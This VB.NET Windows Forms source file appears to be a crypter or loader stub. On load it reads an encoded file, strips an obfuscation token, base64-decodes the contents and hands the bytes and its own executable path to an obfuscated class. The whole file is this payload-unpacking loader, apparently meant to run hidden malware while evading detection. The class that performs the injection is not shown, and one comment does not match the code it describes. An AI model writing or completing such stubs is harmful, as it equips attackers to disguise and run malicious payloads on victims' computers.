Imports System.IO
Imports System.Reflection
Imports System.Runtime.CompilerServices
Imports System.Text

Public Class Form1
    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Dim filesbytes As Byte() = IO.File.ReadAllBytes("STAB.KNX") 'reads binary from the file 
        Dim lol As String = System.Text.Encoding.ASCII.GetString(filesbytes) 'converts bytes to string , so we can do whatever we want to them
        Dim binaryData() As Byte = Convert.FromBase64String(lol.Replace("#33FWQ@", "A")) ' converts base64 string to bytes , also replaces all $ with A's 
        Dim x As New iDqGNekYUus : x.ApvTmhoJQq(binaryData, Process.GetCurrentProcess.MainModule.FileName)
        Me.Close() 'closes the application 
    End Sub
End Class